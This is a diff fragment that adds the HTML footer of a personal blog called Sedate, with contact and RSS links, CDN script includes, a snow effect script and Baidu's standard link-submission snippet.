+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:sedate0x00@gmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="\#">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-rss"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    Blog by <a href="http://sedate.cc/">Sedate</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Snow JavaScript -->
+<script src="/js/snow.js"></script>
+
+<script>
+    createSnow('http://sedate.cc/img/', 60);
+</script>
+
+<!-- Disqus Comments -->
+
+
+<!-- Baidu Push -->
+
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+</body>
+
+</html>
